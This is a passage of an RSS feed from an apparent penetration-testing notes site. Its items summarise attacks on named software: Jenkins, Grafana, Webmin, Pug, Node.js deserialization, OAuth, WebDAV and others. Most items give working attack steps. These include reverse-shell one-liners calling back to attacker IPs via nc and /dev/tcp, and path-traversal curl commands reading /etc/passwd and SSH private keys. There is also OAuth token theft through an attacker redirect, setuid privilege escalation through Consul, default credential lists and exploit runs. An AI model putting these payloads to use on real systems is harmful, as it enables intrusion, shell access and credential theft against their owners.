&amp;#39;http://example.</description>
    </item>
    <item>
      <title>PHP Object Injection</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/php-object-injection/</link>
      <pubDate>Thu, 09 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/php-object-injection/</guid>
      <description>Investigation linkBelow is an example of an index.php in PHP web application.&#xA;&amp;lt;?php class Example { public $file = &amp;#39;example.txt&amp;#39;; public $msg = &amp;#39;Hello World&amp;#39;; public function SomeFunc() { // Some code ... } public function __destruct() { file_put_contents(__DIR__ . &amp;#39;/&amp;#39; . $this-&amp;gt;file,$this-&amp;gt;msg,FILE_APPEND); } } $data = unserialize($_GET[&amp;#39;data&amp;#39;]); // Some code ... ?&amp;gt; This code adds a text file named example.txt, that contains &amp;ldquo;Hello World&amp;rdquo; strings, into the web root directory.</description>
    </item>
    <item>
      <title>PHP Srand Time Abusing</title>
      <link>https://documentnation.github.io/docs/hdks/web/php-srand-time-abusing/</link>
      <pubDate>Thu, 09 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/php-srand-time-abusing/</guid>
      <description>Investigation link function generate_random_number() { srand(time()); // Some code for generating random number... return random_numbers; } For example, assume website uses the above function that generates random numbers or strings to be used for authentications such as activation code, multi-factor security code.&#xA;In such cases, we can replace the “time()” function with the “strtotime()” to make the result to be non-random.&#xA;Exploitation link1. Send Request linkFirst off, send the request for executing the desired function e.</description>
    </item>
    <item>
      <title>JSON.NET Deserialization</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/json-net-deserialization/</link>
      <pubDate>Wed, 08 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/json-net-deserialization/</guid>
      <description>Investigation linkWe can decompile .dll files using ILSpy in Windows. If you like to use ILSpy in Linux, use AvaloniaILSpy.&#xA;json = JsonConvert.DeserializeObject&amp;lt;Example&amp;gt;(json); If the application uses “JsonConvert.DeserializeObject” function, we can abuse JSON object and execute arbitrary code or read local files.&#xA;Exploitation linkWe can give the Json value to the “JsonConvert.DeserializeObject(json)” with a reserved key ($type).&#xA;The format is as follow. The value of $type is a string that contains the assembly-qualified name of the .</description>
    </item>
    <item>
      <title>WebSocket Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/websocket-pentesting/</link>
      <pubDate>Wed, 08 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/websocket-pentesting/</guid>
      <description>Connect with CLI linkwebsocat is a command-line client for WebSockets, like netcat for&#xA;websocat ws://&amp;lt;ip&amp;gt;/ Connect with Python Script link import websocket,json ws = websocket.WebSocket() ws.connect(&amp;#34;ws://10.0.0.1/&amp;#34;) d = {&amp;#34;message&amp;#34;: &amp;#34;hello&amp;#34;} data = str(json.dumps(d)) ws.send(data) result = ws.recv() print(json.loads(result)) As above, we can manipulate the data to send. For example,&#xA;{&amp;#34;message&amp;#34;: &amp;#34;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;#34;} If the website reflects the result of the above interactions, we can affect the website.&#xA;Blind SQL Injection linkFirst, create a Python script to establish a middleware server to forward sqlmap payloads to the target WebSocket server.</description>
    </item>
    <item>
      <title>Apache Conf Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/apache-conf-privilege-escalation/</link>
      <pubDate>Tue, 07 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/apache-conf-privilege-escalation/</guid>
      <description>Investigation link ls -al /etc/apache2 -rwxrwxrwx 1 root root 7094 NOV 7 2023 apache2.conf If we can modify the apache configuration file, we can update the web owner (www-data) to arbitrary user.&#xA;Exploitation link1. Update Apache.Conf linkFirst modify “apache.conf” file to change the web user with new one.&#xA;# These need to be set in /etc/apache2/envvars User www-data Group www-data 2. Insert Reverse Shell Script linkIn the web directory (e.g. /var/www/html), create the script to reverse shell.</description>
    </item>
    <item>
      <title>HTTP Rate Limit Bypass</title>
      <link>https://documentnation.github.io/docs/hdks/web/method/http-rate-limit-bypass/</link>
      <pubDate>Tue, 07 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/method/http-rate-limit-bypass/</guid>
      <description>Bypass linkWe may be able to bypass the rate limiting by adding one of the following headers and change the IP per request.&#xA;Sometimes, we need to add multiple headers.&#xA;X-Forwarded: &amp;lt;IP&amp;gt; X-Forwarded-For: &amp;lt;IP&amp;gt; X-Forwarded-Host: &amp;lt;IP&amp;gt; X-Client-IP: &amp;lt;IP&amp;gt; X-Remote-IP: &amp;lt;IP&amp;gt; X-Remote-Addr: &amp;lt;IP&amp;gt; X-Host: &amp;lt;IP&amp;gt; X-Originating-IP: &amp;lt;IP&amp;gt; </description>
    </item>
    <item>
      <title>Codiad Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/codiad-pentesting/</link>
      <pubDate>Sun, 26 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/codiad-pentesting/</guid>
      <description>Default Credentials link # Docker image - https://hub.docker.com/r/bitnami/codiad user:bitnami Enumeration link # Get current directory in the system /components/project/controller.php?action=get_current Remote Code Execution (RCE) v2.8.4 link wget https://www.exploit-db.com/exploits/49705 -O exploit.py # Linux python3 exploit.py https://example.com/ admin admin &amp;lt;local-ip&amp;gt; 4444 linux # Windows python3 exploit.py https://example.com/ admin admin &amp;lt;local-ip&amp;gt; 4444 windows </description>
    </item>
    <item>
      <title>Apache ActiveMQ Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/apache-activemq-pentesting/</link>
      <pubDate>Thu, 23 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/apache-activemq-pentesting/</guid>
      <description>Default Credentials link admin:admin Interaction with MQTT linkIf the MQTT server is runnong on the target system, we can subscribe/publish to a topic in ActiveMQ using MQTT client.&#xA;Subscribe to a Topic link # -h: Host # -t: Topic name # -V: MQTT protocol version (5, 31, 311) mosquitto_sub -h example.com -u admin -P admin -t &amp;#39;example/topic&amp;#39; -V 31 Web Shell by File Upload JSP linkActiveMQ is vulnerable to web shell via file upload an arbitrary JSP file.</description>
    </item>
    <item>
      <title>Memcache Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/network/protocol/memcache-pentesting/</link>
      <pubDate>Thu, 23 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/protocol/memcache-pentesting/</guid>
      <description>Communication linkWe can communicate with memcache server using Netcat.&#xA;nc -vn &amp;lt;ip&amp;gt; 11211 Connection to &amp;lt;ip&amp;gt; 11211 port [tcp/*] succeeded! # Commands in nc version stats stats slabs stats items stats cachedump &amp;lt;number&amp;gt; 0 stats cachedump 1 0 get &amp;lt;item_name&amp;gt; </description>
    </item>
    <item>
      <title>CMS (Content Management System) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/cms/</link>
      <pubDate>Mon, 20 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/cms/</guid>
      <description>CMS Detection linkIf you don&amp;rsquo;t know which CMS used in target websites, you can detect it using Cmseek which is an automatic CMS detection tool.&#xA;cmseek -u vulnerable.com </description>
    </item>
    <item>
      <title>ClipBucket Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/clipbucket-pentesting/</link>
      <pubDate>Sun, 19 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/clipbucket-pentesting/</guid>
      <description>Arbitrary File Upload &amp;lt; v4.0.0 linkClipBucket versions before 4.0.0 is vulnerable to file upload in ‘uploader’ actions. We can upload arbitrary files so we can execute reverse shell.&#xA;1. Prepare Payload linkCreate a PHP script to reverse shell in local machine.&#xA;cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php Update $ip and $port with your local ip address and port.&#xA;2. Upload the Payload linkNext upload the above PHP script to the target website.&#xA;curl -F &amp;#34;file=@shell.</description>
    </item>
    <item>
      <title>Insecure Deserialization</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/insecure-deserialization/</link>
      <pubDate>Fri, 17 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/insecure-deserialization/</guid>
      <description>PHP Gadget Chains linkPHPGGC linkPHPGGC is a library of PHP unserialize() payloads along with a tool to generate them, from command line or programmatically.&#xA;phpggc -l Ysoserial linkYsoserial is a proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.</description>
    </item>
    <item>
      <title>Apache Tomcat Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/apache-tomcat-pentesting/</link>
      <pubDate>Tue, 14 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/apache-tomcat-pentesting/</guid>
      <description>Directories linkBelow are common directories for Apache Tomcat.&#xA;/examples /examples/jsp/cal/login.html /examples/jsp/error/error.html /examples/jsp/snp/snoop.jsp /examples/servlet/HelloWorldEXample /examples/servlet/JndiServlet /examples/servlet/RequestHeaderExample /examples/servlet/RequestInfoExample /examples/servlet/RequestParamExample /host-manager /manager /manager/jmxproxy/?qry=STUFF /manager/status /manager/status/all # We can execute commands in /manager/text/ directory /manager/text/{command}?{parameters} /manager/text/deploy?path=/foo /manager/text/list /manager/text/resources /manager/text/serverinfo /manager/text/vminfo Directory Discovery linkTo enumerate directories automatically, use fuzzing tools.&#xA;ffuf -u https://example.com/FUZZ -w directories.txt ffuf -u https://example.com/host-manager/FUZZ -w ffuf -u https://example.com/manager/FUZZ -w directories.txt Credentials linkBelow are common credentials for the manager app in Tomcat.</description>
    </item>
    <item>
      <title>Log4j Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/log4j-pentesting/</link>
      <pubDate>Tue, 14 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/log4j-pentesting/</guid>
      <description>msfconsole msf&amp;gt; use exploit/multi/http/log4shell_header_injection msf&amp;gt; set HTTP_HEADER ACCEPT msf&amp;gt; set RHOSTS &amp;lt;target-ip&amp;gt; msf&amp;gt; set SRVHOST &amp;lt;local-ip&amp;gt; msf&amp;gt; set SRVPORT 1389 # e.g. Nagios msf&amp;gt; set TARGETURI /~logs msf&amp;gt; set LHOST &amp;lt;local-ip&amp;gt; msf&amp;gt; run shell Exploit Apache Solr (JNDI) linkYou need to prepare your four local terminals.&#xA;1. Start LDAP Server on Your Local Terminal 1 link Install Maven&#xA;sudo apt install maven Get the Payload&#xA;Download the repository.&#xA;git clone https://github.</description>
    </item>
    <item>
      <title>CORS (Cross-Origin Resource Sharing) Attack</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/cors-attack/</link>
      <pubDate>Thu, 09 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/cors-attack/</guid>
      <description>Origin Reflection link1. Change Origin Value of Request Header link Origin: https://attacker.com Origin: https://vulnerable.com.attacker.com 2. Check if the Response Allowing Cross-Origin linkIt&amp;rsquo;s reflected the previous reqeust in the response header, you can exploit it.&#xA;Access-Control-Allow-Origin: https://attacker.com Access-Control-Allow-Origin: https://vulnerable.com.attacker.com Access-Control-Allow-Credentials: true 3. Exploit with Your Malicious Web Page linkFor example, it&amp;rsquo;s hosted as &amp;ldquo;https://attacker.com/exploit&#34; or &amp;ldquo;https://vulnerable.com.attacker.com/exploit&#34;.&#xA;Add the JavaScript code in the web page.&#xA;It shows the users&amp;rsquo; sensitive information of the target website in your server&amp;rsquo;s log.</description>
    </item>
    <item>
      <title>Browser in the Browser (BITB) Attack</title>
      <link>https://documentnation.github.io/docs/hdks/web/browser-in-the-browser-attack/</link>
      <pubDate>Thu, 02 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/browser-in-the-browser-attack/</guid>
      <description>Use Templates linkThis repository is useful for attacking.</description>
    </item>
    <item>
      <title>OpenCATS Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/opencats-pentesting/</link>
      <pubDate>Tue, 31 Jan 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/opencats-pentesting/</guid>
      <description>Default Credentials link admin:admin admin:cats </description>
    </item>
    <item>
      <title>Restaurant Management System (RMS) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/restaurant-management-system/</link>
      <pubDate>Sun, 29 Jan 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/restaurant-management-system/</guid>
      <description>Remote Code Execution (RCE) v1.0 linkSee the Exploit-DB for details.&#xA;python3 rms-rce.py https://example.com/rms/ When uploading successfully, we can access to https://example.com/rms/images/reverse-shell.php?cmd=id</description>
    </item>
    <item>
      <title>WebAnno Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/webanno-pentesting/</link>
      <pubDate>Tue, 24 Jan 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/webanno-pentesting/</guid>
      <description>Default Credentials link admin:admin Reverse Shell linkIf the target system opens the website assoated with WebAnno service, we can execute reverse shell by uploading the payload and access to the webpage hosts the payload.&#xA;1. Go to the Upload Screen in Dashboard link Login Click “Projects”. Select the project in left pane. Click Documents tab. 2. Prepare Payload linkWebAnno allows us to upload arbitrary file format, so we can upload PHP file for reverse shell.</description>
    </item>
    <item>
      <title>Grafana Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/grafana-pentesting/</link>
      <pubDate>Sun, 15 Jan 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/grafana-pentesting/</guid>
      <description>Default Credential link admin:admin admin:prom-operator Configuration File linkThe configuration file contains the admin credentials. See the “admin_user” and “admin_password” section in the file.&#xA;/etc/grafana/grafana.ini Path Traversal link curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../etc/passwd -o passwd curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini -o grafana.ini curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../root/.ssh/id_rsa curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../root/.bash_history curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../home/grafana/.ssh/id_rsa curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../home/grafana/.bash_history Getting a Shell vis JWT, Grafana Pod linkSome Grafana versions are vulnerable to Path Traversal. Kubernetes creates environment variables by default.</description>
    </item>
    <item>
      <title>WebDAV Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/webdav-pentesting/</link>
      <pubDate>Mon, 09 Jan 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/webdav-pentesting/</guid>
      <description>Enumeration link msfconsole msf&amp;gt; use auxiliary/scanner/http/webdav_scanner Default Credentials link wampp:xampp Reverse Shell link1. Check if the exploit can be uploaded link davtest -url http://example.com/davdir -auth &amp;#39;user:pass&amp;#39; 2. Upload the Reverse Shell Script linkIf we can upload the file e.g. PHP file, upload the script for reverse shell.&#xA;davtest -url http://example.com/davdir -auth &amp;#39;user:pass&amp;#39; -uploadfile shell.php -uploadloc shell.php 3. Get a Shell linkIn local machine, start listener for getting a shell.&#xA;nc -lvnp 4444 Now access to http://example.</description>
    </item>
    <item>
      <title>Node.js Deserialization Attack</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/nodejs-deserialization-attack/</link>
      <pubDate>Mon, 02 Jan 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/nodejs-deserialization-attack/</guid>
      <description>Cookie Reverse Shell link1. Generate a Payload linkWe can use the online tools like RunKit to execute the node package.&#xA;If you want to do in your local environment, you need to install a npm package first.&#xA;mkdir test cd test npm install node-serialize Next, create the payload for serialization to execute a reverse shell.&#xA;For instance, the file is named “serialize.js”.&#xA;let y = { rce: function() { require(&amp;#39;child_process&amp;#39;).exec(&amp;#39;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc &amp;lt;local-ip&amp;gt; &amp;lt;local-port&amp;gt; &amp;gt;/tmp/f&amp;#39;, function(error, stdout, stderr) { console.</description>
    </item>
    <item>
      <title>Jenkins Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/jenkins-pentesting/</link>
      <pubDate>Sun, 01 Jan 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/jenkins-pentesting/</guid>
      <description>Brute Force Credentials link msfconsole msf &amp;gt; use auxiliary/scanner/http/jenkins_login Reverse Shell on Dashboard linkYou need to have the credential.&#xA;Opening Listener on Your Local Machine&#xA;nc -lvnp 4444 Login to Jenkins&#xA;Access &amp;ldquo;http://localhost:8080&amp;rdquo; in browser and login.&#xA;Click &amp;ldquo;Manage Jenkins&amp;rdquo; -&amp;gt; &amp;ldquo;Script Console&amp;rdquo;&#xA;Add the Payload in the Console&#xA;r = Runtime.getRuntime() p = r.exec([&amp;#34;/bin/bash&amp;#34;, &amp;#34;-c&amp;#34;, &amp;#34;exec 5&amp;lt;&amp;gt;/dev/tcp/&amp;lt;Attacker_IP&amp;gt;/4444; cat &amp;lt;&amp;amp;5 | while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&amp;#34;] as String[]) p.</description>
    </item>
    <item>
      <title>CRLF (Carriage Return Line Feed) Injection</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/crlf-injection/</link>
      <pubDate>Mon, 26 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/crlf-injection/</guid>
      <description>No content yet.</description>
    </item>
    <item>
      <title>Web Browser Settings for Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/web-browser-settings-for-pentesting/</link>
      <pubDate>Sat, 24 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/web-browser-settings-for-pentesting/</guid>
      <description>Bypass Port Protection linkMany browsers don&amp;rsquo;t accept uncommon ports for HTTP (HTTPS). For example, when we attempt to access http://example.com:22, browsers present that it cannot be accessed.&#xA;To release such a restricted thing, we can edit the setting in browsers.&#xA;Firefox link Enter &amp;ldquo;about:config&amp;rdquo; in search bar. Input &amp;ldquo;network.security.ports.banned.override&amp;rdquo; in the form. Add the desired port (e.g. “22”) to string. </description>
    </item>
    <item>
      <title>Kibana Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/elasticsearch/kibana-pentesting/</link>
      <pubDate>Thu, 22 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/elasticsearch/kibana-pentesting/</guid>
      <description>Vulnerabilities linkLocal File Inclusion (LFI) Version &amp;lt; 6.4.3 &amp;amp; 5.6.13 link curl http://&amp;lt;target-ip&amp;gt;:5601/api/console/api_server?sense_version=@@SENSE_VERSION&amp;amp;apis=../../../../../../.../../../../root.txt Remote Code Execution (RCE) Version &amp;lt; 6.6.0 linkReference: https://github.com/mpgn/CVE-2019-7609</description>
    </item>
    <item>
      <title>Tiny File Manager Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/tiny-file-manager-pentesting/</link>
      <pubDate>Thu, 22 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/tiny-file-manager-pentesting/</guid>
      <description>Default Credentials link admin:admin@123 user:12345 Reverse Shell linkIf we can login and access the dashboard of the Tiny File Manager, upload the reverse shell script and get a shell.&#xA;First, download the reverse shell script.&#xA;wget https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php -O shell.php Update values of “$ip” and “$port” in the above script to our local ip and port for listener which will start. Then upload the script to the arbitrary folder in the Tiny File Manager dashboard.</description>
    </item>
    <item>
      <title>XST (Cross-Site Tracing)</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/xst/</link>
      <pubDate>Thu, 22 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/xst/</guid>
      <description>Add Cookie Header link TRACE / HTTP/1.1 ... Cookie: name=value ... </description>
    </item>
    <item>
      <title>Web PHP Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/web-php-pentesting/</link>
      <pubDate>Tue, 20 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/web-php-pentesting/</guid>
      <description>Deobfuscate PHP Files with Syntax Highlighting linkAccording to the PHP Manual, you might be able to deobfuscate php files by accessing with phps extension if the &amp;ldquo;highlight_file&amp;rdquo; is used in the target website.&#xA;https://vulnerable.com/index.phps </description>
    </item>
    <item>
      <title>HashiCorp Consul Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/hashicorp-consul-pentesting/</link>
      <pubDate>Sat, 10 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/hashicorp-consul-pentesting/</guid>
      <description>Privilege Escalation linkIf you have the ACL token (xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxxx), you may be able to privilege escalation.&#xA;First, create a script which changes the permission of ‘bash’.&#xA;echo &amp;#39;chmod &amp;#43;s /usr/bin/bash&amp;#39; &amp;gt; /tmp/exploit.sh Then curl.&#xA;curl --header &amp;#34;X-Consul-Token: &amp;lt;ACL-TOKEN&amp;gt;&amp;#34; --request PUT -d &amp;#39;{&amp;#34;ID&amp;#34;: &amp;#34;test&amp;#34;, &amp;#34;Name&amp;#34;: &amp;#34;test&amp;#34;, &amp;#34;Address&amp;#34;: &amp;#34;127.0.0.1&amp;#34;, &amp;#34;Port&amp;#34;: 80, &amp;#34;check&amp;#34;: {&amp;#34;Args&amp;#34;: [&amp;#34;/usr/bin/bash&amp;#34;, &amp;#34;/tmp/e.sh&amp;#34;], &amp;#34;interval&amp;#34;: &amp;#34;10s&amp;#34;, &amp;#34;timeout&amp;#34;: &amp;#34;1s&amp;#34;}}&amp;#39; http://127.0.0.1:8500/v1/agent/service/register KV (Key/Value) Store link # Put consul kv put --token &amp;lt;ACL-TOKEN&amp;gt; key value consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 path/to/store data </description>
    </item>
    <item>
      <title>How to Use OWASP ZAP</title>
      <link>https://documentnation.github.io/docs/hdks/web/tool/how-to-use-owasp-zap/</link>
      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/tool/how-to-use-owasp-zap/</guid>
      <description>Automated Scan link Ajax Spider&#xA;If you want to use the ajax spider with HtmlUnit (the easiest way), you may need to install the HtmlUnit.&#xA;sudo apt install libjenkins-htmlunit-core-js-java Intercept Request link Right-click on the URL. Select “Break…” The “Add Breakpoint” window will appear. Manual Request linkOWASP ZAP can resend a request in which you can manually edit the header like the Burp Suite’s Repeater.&#xA;Right-click on the URL. Select “Open/Resend with Request Editor…”.</description>
    </item>
    <item>
      <title>OAuth Attack</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/oauth-attack/</link>
      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/oauth-attack/</guid>
      <description>Change User Info link POST /authenticate HTTP/1.1 ... { &amp;#34;email&amp;#34;:&amp;#34;victim@example.com&amp;#34;, &amp;#34;username&amp;#34;:&amp;#34;attacker&amp;#34;, &amp;#34;token&amp;#34;:&amp;#34;b7Gl7Xoy...&amp;#34; } Steal Tokens link Open Web Server in Your Local Machine&#xA;python3 -m http.server 8000 Inject Your Local URL to the Redirect URL&#xA;Access to the URL below.&#xA;https://vulnerable.com/oauth?redirect_url=http://&amp;lt;attacker-ip&amp;gt;:8000/login&amp;amp;response_type=token&amp;amp;scope=all CSRF link Steal Code&#xA;&amp;lt;iframe src=&amp;#34;https://vulnerable.com/oauth-linking?code=kZ7bfFa...&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt; Hijack redirect_url&#xA;&amp;lt;iframe src=&amp;#34;https://vulnerable.com/auth?client_id=ysdj...&amp;amp;redirect_uri=https://attacker.com&amp;amp;response_type=code&amp;amp;scope=openid%20profile%20email&amp;#34;&amp;gt; &amp;lt;/iframe&amp;gt; Open Redirect&#xA;&amp;lt;script&amp;gt; if (!document.location.hash) { window.location = &amp;#39;https://vulnerable.com/auth?client_id=7Fdx8a...&amp;amp;redirect_uri=https://vulnerable.com/oauth-callback/../post/next?path=https://attacker.com/exploit/&amp;amp;response_type=token&amp;amp;nonce=398...&amp;amp;scope=openid%20profile%20email&amp;#39; } else { window.location = &amp;#39;/?&amp;#39;&amp;#43;document.location.hash.substr(1) } &amp;lt;/script&amp;gt; Proxy Page (postMessage)</description>
    </item>
    <item>
      <title>Pug Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/template-engine/pug-pentesting/</link>
      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/template-engine/pug-pentesting/</guid>
      <description>Server-Side Template Injection (SSTI) link #{2*2} #{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(&amp;#34;child_process&amp;#34;).exec(&amp;#39;id&amp;#39;)}()} Reverse Shell linkFirst off, create a payload.&#xA;use Socket;$i=&amp;#34;&amp;lt;local-ip&amp;gt;&amp;#34;;$p=&amp;lt;local-port&amp;gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);exec(&amp;#34;/bin/sh -i&amp;#34;);}; Encode it with Base64.&#xA;And start listener for getting the incoming connection.&#xA;nc -lvnp 4444 Then prepare the full payload contained the above Base64 encoded hash.&#xA;h1= Hello world p 3*3 is #{3*3} #{spawn_sync = this.process.binding(&amp;#39;spawn_sync&amp;#39;)} #{ normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&amp;amp;&amp;amp;(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(&amp;#39; &amp;#39;);typeof a.shell===&amp;#39;string&amp;#39;?c=a.shell:c=&amp;#39;/bin/sh&amp;#39;,b=[&amp;#39;-c&amp;#39;,g];}typeof a.argv0===&amp;#39;string&amp;#39;?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f&amp;#43;&amp;#39;=&amp;#39;&amp;#43;d[f]);return{file:c,args:b,options:a,envPairs:e};}} #{spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.</description>
    </item>
    <item>
      <title>Webmin Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/webmin-pentesting/</link>
      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/webmin-pentesting/</guid>
      <description>Default Credentials link admin:admin password_chagne.cgi Command Injection version=1.890 link msfconsole msf&amp;gt; use exploit/linux/http/webmin_backdoor msf&amp;gt; set rhosts &amp;lt;target-ip&amp;gt; msf&amp;gt; set lhost &amp;lt;local-ip&amp;gt; msf&amp;gt; run shell Remote Code Execution (RCE) version&amp;lt;2.37 linkWebmin version&amp;lt;2.37 is vulnerable to remote code execution.&#xA;Download the payload .&#xA;git clone https://github.com/MuirlandOracle/CVE-2019-15107 cd CVE-2019-15107 python3 CVE-2019-15107.py &amp;lt;target-ip&amp;gt; </description>
    </item>
    <item>
      <title>AJP (Apache JServ Protocol) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/java/ajp-pentesting/</link>
      <pubDate>Tue, 22 Nov 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/java/ajp-pentesting/</guid>
      <description>Enumeration link nmap --script ajp-auth -p 8009 &amp;lt;target-ip&amp;gt; nmap --script ajp-auth --script-args ajp-auth.path=/login -p 8009 &amp;lt;target-ip&amp;gt; nmap --script ajp-brute -p 8009 &amp;lt;target-ip&amp;gt; nmap --script ajp-headers -p 8009 &amp;lt;target-ip&amp;gt; nmap --script ajp-methods -p 8009 &amp;lt;target-ip&amp;gt; nmap --script ajp-request -p 8009 &amp;lt;target-ip&amp;gt; Ghostcat File Inclusion linkIt&amp;rsquo;s a vulnerability of Tomcat AJP (CVE-2020-1938).&#xA;Use Metasploit for exploiting it.&#xA;msfconsole msf6 &amp;gt; use auxiliary/admin/http/tomcat_ghostcat msf6 auxiliary(admin/http/tomcat_ghostcat) &amp;gt; set rhosts &amp;lt;target-ip&amp;gt; msf6 auxiliary(admin/http/tomcat_ghostcat) &amp;gt; exploit </description>
    </item>
    <item>
      <title>Apache Struts Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/java/apache-struts-pentesting/</link>
      <pubDate>Tue, 22 Nov 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/java/apache-struts-pentesting/</guid>
